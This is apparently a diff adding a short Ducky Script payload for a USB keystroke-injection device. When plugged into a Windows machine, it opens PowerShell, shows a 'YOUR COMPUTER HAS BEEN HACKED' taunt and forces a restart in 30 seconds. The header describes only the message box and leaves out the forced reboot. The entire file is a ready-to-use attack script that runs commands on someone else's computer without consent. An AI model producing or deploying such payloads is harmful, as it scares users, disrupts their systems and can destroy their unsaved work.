@@ -1,0 +1,21 @@
+REM Author: Luke487
+REM Description: Opens powershell messagebox
+REM Version: 1.5
+DELAY 600
+GUI r
+DELAY 600
+STRING powershell
+ENTER
+DELAY 1200
+STRING PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('YOUR COMPUTER HAS BEEN HACKED IDIOT GET REKT')"
+ENTER
+DELAY 600
+GUI d
+DELAY 100
+ALT TAB
+GUI r
+DELAY 600
+STRING shutdown -r -t 30
+ENTER
+DELAY 100
+ENTER
